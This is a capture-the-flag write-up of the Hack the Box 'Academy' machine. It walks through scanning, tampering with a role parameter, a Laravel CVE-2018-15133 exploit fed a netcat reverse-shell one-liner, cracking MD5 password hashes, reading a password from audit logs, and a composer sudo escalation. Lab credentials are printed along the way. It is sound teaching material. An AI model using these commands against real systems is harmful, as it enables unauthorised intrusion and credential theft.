@@ -1,0 +1,1337 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.21.0 by Michael Rose
+  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Hackthebox write-up: Academy | Davi Cruz</title>
+<meta name="description" content="Hello everyone!  The box of this week will be Academy, another easy-rated Linux box from Hack the Box created by egre55 and mrb3n.">
+
+
+  <meta name="author" content="Davi Cruz">
+  
+  <meta property="article:author" content="Davi Cruz">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Davi Cruz">
+<meta property="og:title" content="Hackthebox write-up: Academy">
+<meta property="og:url" content="https://davicruz.com/writeup/2021/02/htb-academy/">
+
+
+  <meta property="og:description" content="Hello everyone!  The box of this week will be Academy, another easy-rated Linux box from Hack the Box created by egre55 and mrb3n.">
+
+
+
+  <meta property="og:image" content="https://i.imgur.com/PjYV5g5.png">
+
+
+
+  <meta name="twitter:site" content="@zerahzurc">
+  <meta name="twitter:title" content="Hackthebox write-up: Academy">
+  <meta name="twitter:description" content="Hello everyone!  The box of this week will be Academy, another easy-rated Linux box from Hack the Box created by egre55 and mrb3n.">
+  <meta name="twitter:domain" content="davicruz.com">
+  <meta name="twitter:url" content="https://davicruz.com/writeup/2021/02/htb-academy/">
+
+  
+    <meta name="twitter:card" content="summary">
+    
+      <meta name="twitter:image" content="https://i.imgur.com/PjYV5g5.png">
+    
+  
+
+  
+
+
+
+  <meta property="article:published_time" content="2021-02-27T13:00:00-03:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="https://davicruz.com/writeup/2021/02/htb-academy/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "Davi Cruz",
+      "url": "https://davicruz.com/",
+      "sameAs": ["https://twitter.com/zerahzurc","https://www.linkedin.com/in/davicruz","https://github.com/davi-cruz"]
+    
+  }
+</script>
+
+
+  <meta name="google-site-verification" content="hrWV-PqvbpxEy2HdpVYFQNws2Sz_tROleVyF18s2kWA" />
+
+
+  <meta name="msvalidate.01" content="60B1FA6CDAF15D226AB529AF30386BD8">
+
+
+
+  <meta name="yandex-verification" content="08de8d8c0326420f">
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Davi Cruz Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css">
+
+<!--[if IE]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+<!-- Favicon -->
+<link rel="shortcut icon" href="/assets/images/favicon.ico" />
+
+<!-- Multilang tags -->
+
+    
+<link rel="alternate" hreflang="pt-BR" href="/writeup/2021/02/htb-academy/">
+    
+
+    
+<link rel="alternate" hreflang="en-US" href="/en-US/writeup/2021/02/htb-academy/">
+    
+
+
+<!-- Cookie Consent - Osano -->
+<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/cookieconsent@3/build/cookieconsent.min.css" />
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+    <nav class="skip-links">
+  <h2 class="screen-reader-text">Skip links</h2>
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          
+          <a class="site-logo" href="https://davicruz.com/en-US"><img src="/assets/images/logo.png" alt=""></a>
+          
+          <a class="site-title" href="https://davicruz.com/en-US">
+            Davi Cruz
+            
+          </a>
+        
+        <ul class="visible-links">
+<li class="masthead__menu-item">
+            <a href="/en-US/categories/">Categories</a>
+          </li>
+<li class="masthead__menu-item">
+            <a href="/en-US/tag/">Tags</a>
+          </li>
+<li class="masthead__menu-item">
+            <a href="/en-US/about/">About</a>
+          </li>
+</ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+        <img src="/assets/images/bio-photo.jpg" alt="Davi Cruz" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">Davi Cruz</h3>
+    
+    
+      <div class="author__bio" itemprop="description">
+        <p>Just another Cybersecurity professional</p>
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name">São Paulo, BR</span>
+        </li>
+      
+
+      
+        
+          
+            <li><a href="https://linkedin.com/in/davicruz" rel="nofollow noopener noreferrer"><i class="fab fa-fw fab fa-linkedin" aria-hidden="true"></i><span class="label">Linkedin</span></a></li>
+          
+        
+          
+            <li><a href="https://twitter.com/zerahzurc" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-twitter-square" aria-hidden="true"></i><span class="label">Twitter</span></a></li>
+          
+        
+          
+            <li><a href="https://github.com/davi-cruz" rel="nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+<li>
+  <strong></strong>
+  
+  <a class="link-br" href=""></a>
+  
+</li>
+
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Hackthebox write-up: Academy">
+    <meta itemprop="description" content="Hello everyone!The box of this week will be Academy, another easy-rated Linux box from Hack the Box created by egre55 and mrb3n.">
+    <meta itemprop="datePublished" content="2021-02-27T13:00:00-03:00">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Hackthebox write-up: Academy
+</h1>
+          
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-calendar-alt" aria-hidden="true"></i>
+        <time datetime="2021-02-27T13:00:00-03:00">February 27, 2021</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          8 minute read
+        
+      </span>
+    
+
+
+      <!-- Start Read in other languages-->
+        <span class="page__meta-sep page__meta-lang"></span>
+        
+        
+        
+        <span class="page__meta-lang"><a href="/writeup/2021/02/htb-academy/">Leia também em  <img class="emoji" title=":brazil:" alt=":brazil:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f1e7-1f1f7.png" height="20" width="20"></a></span>
+        
+
+        
+
+        
+
+        
+        
+        
+        
+      <!-- End Read in other languages-->
+      <span class="page__meta-sep page__meta-share"></span>
+      <span class="page__meta-share">
+        <i class="fas fa-share-alt" aria-hidden="true"></i>
+        <a href="#sharelinks">Share</a>
+      </span>
+  </p>
+
+
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p>Hello everyone!</p>
+
+<p>The box of this week will be <strong>Academy</strong>, another easy-rated Linux box from <a href="https://www.hackthebox.eu">Hack the Box</a> created by <a href="https://app.hackthebox.eu/users/1190">egre55</a> and <a href="https://app.hackthebox.eu/users/2984">mrb3n</a>.<!--more--></p>
+
+<p class="notice--info"><img class="emoji" title=":information_source:" alt=":information_source:" src="https://github.githubassets.com/images/icons/emoji/unicode/2139.png" height="20" width="20"> <strong>Info</strong>: Write-ups for Hack the Box are always posted as soon as machines get retired.</p>
+
+<p><img src="https://i.imgur.com/3SXgHMd.png" alt="HTB Academy" class="align-center"></p>
+
+<h2 id="enumeration">Enumeration</h2>
+
+<p>Started the enumeration, as usual, by running <code class="language-plaintext highlighter-rouge">nmap</code> quick scan to check what is running on this box.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-Pn</span> <span class="nt">-oA</span> quick 10.10.10.215
+Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>will be slower.
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-02-17 12:32 <span class="nt">-03</span>
+Nmap scan report <span class="k">for </span>10.10.10.215
+Host is up <span class="o">(</span>0.15s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   3072 c0:90:a3:d8:35:25:6f:fa:33:06:cf:80:13:a0:a5:53 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 2a:d5:4b:d0:46:f0:ed:c9:3c:8d:f6:5d:ab:ae:77:96 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 e1:64:14:c3:cc:51:b2:3b:a6:28:a7:b1:ae:5f:45:35 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Did not follow redirect to http://academy.htb/
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>34.43 seconds                                  
+</code></pre></div></div>
+
+<h3 id="80-tcp---http-service">80 TCP - HTTP Service</h3>
+
+<p>Checking this service from <code class="language-plaintext highlighter-rouge">nmap</code> scan, noticed that the page contains a redirect to the host <strong>academy.htb</strong>, which probably was not able to follow redirect once this domain name was not solved. After adding it to the <code class="language-plaintext highlighter-rouge">/etc/hosts</code>, we were able to navigate to the specified page which contains 2 links, one for registering and other to login to this HTB Academy service.</p>
+
+<p><img src="https://i.imgur.com/jPgHc5K.png" alt="HTB Academy - 80/TCP" class="align-center"></p>
+
+<p>As the page source did not disclosed nothing, proceeded by creating a dummy account (<code class="language-plaintext highlighter-rouge">dummy:P@ssword</code>) to get initial access to the platform but noticed something interesting in the post request, where a hidden field from the register form was sending a parameter <strong>roleid</strong>, set to value <strong>0</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /register.php HTTP/1.1
+Host: academy.htb
+Content-Length: 57
+Cache-Control: max-age<span class="o">=</span>0
+Upgrade-Insecure-Requests: 1
+Origin: http://academy.htb
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 <span class="o">(</span>Windows NT 10.0<span class="p">;</span> Win64<span class="p">;</span> x64<span class="o">)</span> AppleWebKit/537.36 <span class="o">(</span>KHTML, like Gecko<span class="o">)</span> Chrome/87.0.4280.88 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.9,image/avif,image/webp,image/apng,<span class="k">*</span>/<span class="k">*</span><span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.8,application/signed-exchange<span class="p">;</span><span class="nv">v</span><span class="o">=</span>b3<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.9
+Referer: http://academy.htb/register.php
+Accept-Encoding: <span class="nb">gzip</span>, deflate
+Accept-Language: en-US,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.9
+Cookie: <span class="nv">PHPSESSID</span><span class="o">=</span>amjdd7mhh764rbt4jvb0ujqa1i
+Connection: close
+
+<span class="nv">uid</span><span class="o">=</span>dummy&amp;password<span class="o">=</span>P%40ssw0rd&amp;confirm<span class="o">=</span>P%40ssw0rd&amp;roleid<span class="o">=</span>0
+</code></pre></div></div>
+
+<p>Let us proceed with the default value for now but we already have an idea of what could be tampered if necessary.</p>
+
+<p>After entering the recently created credentials, noticed that the user could see the academy catalog, with some pre-loaded credit but no operation (unlock) was possible once the unlock API (<code class="language-plaintext highlighter-rouge">http://academy.htb/api/modules/unlock</code>) was not available, returning a HTTP 404 error.</p>
+
+<p><img src="https://i.imgur.com/ZWqyaUH.png" alt="HTB Academy - Logged in" class="align-center"></p>
+
+<h3 id="gobuster">Gobuster</h3>
+
+<p>Once we came into a dead end, let us see if we can brute force any path on this box that might led us to a possible initial foothold. Running <code class="language-plaintext highlighter-rouge">gobuster</code> gave us 2 interesting pages to investigate further: <strong>admin.php</strong> and <strong>config.php</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster <span class="nb">dir</span> <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-u</span> http://academy.htb <span class="nt">-t</span> 50 <span class="nt">-o</span> gobuster_80.txt <span class="nt">-x</span> php,html,txt
+<span class="o">===============================================================</span>
+Gobuster v3.0.1
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:            http://academy.htb
+<span class="o">[</span>+] Threads:        50
+<span class="o">[</span>+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+<span class="o">[</span>+] Status codes:   200,204,301,302,307,401,403
+<span class="o">[</span>+] Cookies:        <span class="nv">PHPSESSID</span><span class="o">=</span>amjdd7mhh764rbt4jvb0ujqa1i
+<span class="o">[</span>+] User Agent:     gobuster/3.0.1
+<span class="o">[</span>+] Extensions:     txt,php,html
+<span class="o">[</span>+] Timeout:        10s
+<span class="o">===============================================================</span>
+2021/02/17 12:51:55 Starting gobuster
+<span class="o">===============================================================</span>
+/index.php <span class="o">(</span>Status: 200<span class="o">)</span>
+/images <span class="o">(</span>Status: 301<span class="o">)</span>
+/login.php <span class="o">(</span>Status: 200<span class="o">)</span>
+/home.php <span class="o">(</span>Status: 200<span class="o">)</span>
+/register.php <span class="o">(</span>Status: 200<span class="o">)</span>
+/admin.php <span class="o">(</span>Status: 200<span class="o">)</span>
+/config.php <span class="o">(</span>Status: 200<span class="o">)</span>
+Progress: 48339 / 220561 <span class="o">(</span>21.92%<span class="o">)</span><span class="k">in</span>.php <span class="o">(</span>Status: 200<span class="o">)</span>
+
+</code></pre></div></div>
+
+<h3 id="adminphp">admin.php</h3>
+
+<p>Accessing <code class="language-plaintext highlighter-rouge">admin.php</code> noticed that this pace looks very similar to the previous one, but our dummy credentials did not work there. So, remembering from the parameter we saw in the registration form (<strong>roleid</strong>), I decided to create another account but, in this case, tampering the data sent in the request, replacing 0 by 1 for the mentioned identifier. With this new account, which roleid = <strong>1</strong>, I was able to login to the restricted area and the page below was displayed:</p>
+
+<p><img src="https://i.imgur.com/s54Fy4z.png" alt="HTB Academy - Admin Page" class="align-center"></p>
+
+<p>Besides not existing any information hidden in the source code of this page, what called attention was the host <strong>dev-staging-01.academy.htb</strong> which might also be running in this box.</p>
+
+<p>After adding it to the hosts file under the same IP, the page below was shown, which is an error handler framework for PHP, which allows developers to debug code in their code, but in this case was open and leaking lots of information such as credentials and environment variables.</p>
+
+<p><img src="https://i.imgur.com/EdXyUeb.png" alt="HTB Academy - DevSta" class="align-center"></p>
+
+<p>What most called attention in the information leaked was the MySQL credentials and Laravel App_key, which might lead us to an initial foothold in this box.</p>
+
+<h2 id="initial-foothold">Initial Foothold</h2>
+
+<p>As we don’t have MySQL 3306/TCP open in this box, based on the initial nmap scan, searching a little about what could be done by using the Laravel App_key I came across the <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15133">CVE-2018-15133</a> which can lead to RCE through an unserialized call in some affected Laravel versions. If we were lucky this might work for this box <img class="emoji" title=":smiley:" alt=":smiley:" src="https://github.githubassets.com/images/icons/emoji/unicode/1f603.png" height="20" width="20">.</p>
+
+<p>Doing some search, I have found <a href="https://github.com/aljavier/exploit_laravel_cve-2018-15133">this repository</a> which implements this exploit in a simple manner, which was the one I have used to get an initial foothold in the box.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 ./pwn_laravel.py http://dev-staging-01.academy.htb dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0<span class="o">=</span> <span class="nt">-c</span> <span class="s2">"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 4443 &gt;/tmp/f"</span>
+</code></pre></div></div>
+
+<h2 id="user-flag">User flag</h2>
+
+<p>After upgrading the reverse shell, first thing to check was the content of the previously enumerated file <strong>config.php</strong>, listed below:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@academy:/var/www/html<span class="nv">$ </span><span class="nb">cat</span> ./academy/public/config.php 
+&lt;?php
+ini_set<span class="o">(</span><span class="s1">'display_errors'</span>, 1<span class="o">)</span><span class="p">;</span>
+ini_set<span class="o">(</span><span class="s1">'display_startup_errors'</span>, 1<span class="o">)</span><span class="p">;</span>
+error_reporting<span class="o">(</span>E_ALL<span class="o">)</span><span class="p">;</span>
+<span class="nv">$link</span><span class="o">=</span>mysqli_connect<span class="o">(</span><span class="s1">'localhost'</span>,<span class="s1">'root'</span>,<span class="s1">'GkEWXn4h34g8qx9fZ1'</span>,<span class="s1">'academy'</span><span class="o">)</span><span class="p">;</span>
+?&gt;
+</code></pre></div></div>
+
+<p>Connecting to local instance of MySQL using the obtained credentials, noticed that there were some users created and their password hashes, that could possibly be reused by one of the existing users of this box.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>mysql <span class="nt">-u</span> root <span class="nt">-p</span>
+Password:
+
+mysql&gt; use academy<span class="p">;</span>
+Reading table information <span class="k">for </span>completion of table and column names
+You can turn off this feature to get a quicker startup with <span class="nt">-A</span>
+
+Database changed
+mysql&gt; <span class="k">select</span> <span class="k">*</span> from <span class="nb">users</span><span class="p">;</span>
++----+----------+----------------------------------+--------+---------------------+
+| <span class="nb">id</span> | username | password                         | roleid | created_at          |
++----+----------+----------------------------------+--------+---------------------+
+|  5 | dev      | a317f096a83915a3946fae7b7f035246 |      0 | 2020-08-10 23:36:25 |
+| 11 | test8    | 5e40d09fa0529781afd1254a42913847 |      0 | 2020-08-11 00:44:12 |
+| 12 | <span class="nb">test</span>     | 098f6bcd4621d373cade4e832627b4f6 |      0 | 2020-08-12 21:30:20 |
+| 13 | test2    | ad0234829205b9033196ba818f7a872b |      1 | 2020-08-12 21:47:20 |
+| 14 | tester   | 098f6bcd4621d373cade4e832627b4f6 |      1 | 2020-08-13 11:51:19 |
++----+----------+----------------------------------+--------+---------------------+
+</code></pre></div></div>
+
+<p>After some research, found that these passwords were hashed using MD5 prior to storing in DB. Searching in some services online, the following passwords were retrieved:</p>
+
+<ul>
+  <li>dev: <strong>mySup3rP4s5w0rd!!</strong>
+</li>
+  <li>test8: <strong>test8</strong>
+</li>
+  <li>test: <strong>test</strong>
+</li>
+  <li>test2: <strong>test2</strong>
+</li>
+  <li>tester: <strong>test</strong>
+</li>
+</ul>
+
+<p>Now that we have a few passwords, we need to check which user possibly has the user flag. By running the command below, we have identified user <strong>cry0l1t3</strong> as the one we should test the obtained passwords so far:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@academy:/home<span class="nv">$ </span>find /home <span class="nt">-type</span> f 2&gt;/dev/null | <span class="nb">grep </span>user.txt
+/home/cry0l1t3/user.txt
+</code></pre></div></div>
+
+<p>At the first try, using <code class="language-plaintext highlighter-rouge">mySup3rP4s5w0rd!!</code> we were able to login as cry0l1t3 and get the user flag</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cry0l1t3@academy:~<span class="nv">$ </span><span class="nb">cat </span>user.txt 
+&lt;redacted&gt;
+</code></pre></div></div>
+
+<h2 id="root-flag">Root flag</h2>
+
+<p>Now running as cry0l1t3, we can enumerate further this box. The first thing to do is to check his permissions. The user <code class="language-plaintext highlighter-rouge">cry0l1t3</code> cannot run anything as root, based on <code class="language-plaintext highlighter-rouge">sudo -l</code> execution but he is member of <strong>adm</strong> group, which allow us to read contents from <code class="language-plaintext highlighter-rouge">/var/log</code> which might leak some information.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cry0l1t3@academy:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>cry0l1t3: 
+Sorry, user cry0l1t3 may not run <span class="nb">sudo </span>on academy.
+cry0l1t3@academy:~<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>cry0l1t3<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>cry0l1t3<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1002<span class="o">(</span>cry0l1t3<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Always when inspecting the logs from a CTF box, is important to consider its creation time, so all the other player registry entries can be ignored from the inspection. An easier way is to use the command below, which filters only files older than X days, in my case 100 which is the period of days since this box was released in the moment I am solving it.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find /var/log <span class="nt">-mtime</span> +100 <span class="nt">-print</span> 2&gt;/dev/null
+</code></pre></div></div>
+
+<p>Checking first the apache logs, nothing interesting was found by inspecting the access logs, so the most interesting in sequence are the audit logs and then any cron execution.</p>
+
+<p>Checking the audit logs, we can see 2 files matching the mentioned period, which will later be inspected.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cry0l1t3@academy:~<span class="nv">$ </span>find <span class="nb">.</span> <span class="nt">-mtime</span> +100 <span class="nt">-print</span> 2&gt;/dev/null | <span class="nb">grep </span>audit
+/var/log/audit/audit.log.2
+/var/log/audit/audit.log.3
+</code></pre></div></div>
+
+<p>Looking for interesting commands on then (<code class="language-plaintext highlighter-rouge">sudo</code>, <code class="language-plaintext highlighter-rouge">su</code>, <code class="language-plaintext highlighter-rouge">passwd</code>) that could possibly leak some information, I was lucky to find one occurrence of <strong>su</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cry0l1t3@academy:~<span class="nv">$ </span><span class="nb">cat</span> /var/log/audit/audit.log.[2-3] | <span class="nb">grep</span> <span class="s1">'"su"'</span>
+<span class="nb">type</span><span class="o">=</span>TTY <span class="nv">msg</span><span class="o">=</span>audit<span class="o">(</span>1597199293.906:84<span class="o">)</span>: <span class="nb">tty </span><span class="nv">pid</span><span class="o">=</span>2520 <span class="nv">uid</span><span class="o">=</span>1002 <span class="nv">auid</span><span class="o">=</span>0 <span class="nv">ses</span><span class="o">=</span>1 <span class="nv">major</span><span class="o">=</span>4 <span class="nv">minor</span><span class="o">=</span>1 <span class="nb">comm</span><span class="o">=</span><span class="s2">"su"</span> <span class="nv">data</span><span class="o">=</span>6D7262336E5F41634064336D79210A
+</code></pre></div></div>
+
+<p>The data field contains the HEX value of the parameter used in the execution, which can be converted to text. You can use any converter online, but you can also use <code class="language-plaintext highlighter-rouge">vim</code> to this task, as described below:</p>
+
+<ul>
+  <li>
+    <p>Open a file in edit mode using <code class="language-plaintext highlighter-rouge">vim</code></p>
+
+    <div class="language-bash highlighter-rouge">
+<div class="highlight"><pre class="highlight"><code>vim /tmp/test
+</code></pre></div>    </div>
+  </li>
+  <li>
+    <p>Type <code class="language-plaintext highlighter-rouge">Esc</code> to enter em command mode and enter command <code class="language-plaintext highlighter-rouge">:% !xxd</code>. This will convert the existing content into HEX</p>
+  </li>
+  <li>
+    <p>Now pressing <code class="language-plaintext highlighter-rouge">i</code> we’ll enter in <em>Insert Mode</em> and paste the HEX content we want to convert, right after <code class="language-plaintext highlighter-rouge">00000000:</code>.</p>
+  </li>
+  <li>
+    <p>Press <code class="language-plaintext highlighter-rouge">Esc</code> again to return to <code class="language-plaintext highlighter-rouge">command mode</code> and type <code class="language-plaintext highlighter-rouge">:% !xxd -r</code> to return to the actual content to ASCII.</p>
+  </li>
+  <li>
+    <p>You can later save and exit by entering the command <code class="language-plaintext highlighter-rouge">:wq!</code>  but you might have also seen the actual content of this HEX value. Below is the output of the file I’ve created to do this conversion:</p>
+
+    <div class="language-bash highlighter-rouge">
+<div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /tmp/test                    
+mrb3n_Ac@d3my!
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<p>As <strong>mrb3n</strong> is one of the other users of this box this could probably be his password, which was confirmed by running <code class="language-plaintext highlighter-rouge">su mrb3n</code> and typing the password found.</p>
+
+<p>Enumerating his permissions, noticed that he’s not member of any special group but has <code class="language-plaintext highlighter-rouge">sudo</code> privileges to run <strong>composer</strong></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mrb3n@academy:~<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>mrb3n<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>mrb3n<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>mrb3n<span class="o">)</span>
+mrb3n@academy:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>mrb3n: 
+Matching Defaults entries <span class="k">for </span>mrb3n on academy:
+    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User mrb3n may run the following commands on academy:
+    <span class="o">(</span>ALL<span class="o">)</span> /usr/bin/composer
+</code></pre></div></div>
+
+<h3 id="abusing-sudo-permissions">Abusing <code class="language-plaintext highlighter-rouge">sudo</code> permissions</h3>
+
+<p>Checking on <a href="https://gtfobins.github.io/gtfobins/composer/">GTFOBins</a> is possible to escalate privileges by using composer running the snippet below, which worked without issues:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">TF</span><span class="o">=</span><span class="si">$(</span><span class="nb">mktemp</span> <span class="nt">-d</span><span class="si">)</span>
+<span class="nb">echo</span> <span class="s1">'{"scripts":{"x":"/bin/sh -i 0&lt;&amp;3 1&gt;&amp;3 2&gt;&amp;3"}}'</span> <span class="o">&gt;</span><span class="nv">$TF</span>/composer.json
+<span class="nb">sudo </span>composer <span class="nt">--working-dir</span><span class="o">=</span><span class="nv">$TF</span> run-script x
+</code></pre></div></div>
+
+<p>As <strong>root</strong>, finally obtained the flag under <code class="language-plaintext highlighter-rouge">/root/root.txt</code></p>
+
